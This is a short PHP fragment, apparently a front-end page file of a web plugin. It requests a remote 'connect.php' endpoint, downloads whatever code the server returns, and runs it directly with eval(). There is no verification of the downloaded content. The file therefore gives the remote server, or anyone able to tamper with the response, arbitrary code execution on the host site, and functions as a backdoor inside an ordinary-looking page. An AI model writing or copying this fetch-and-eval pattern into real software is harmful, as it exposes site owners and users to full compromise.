<?php
$f='fws/pages-front/details.php';
$url=ZING_URL.'connect.php?file='.$f;
echo '<br />'.$url.'<br />';
$n=new zHttpRequest($url);
$s=$n->DownloadToString();
eval($s);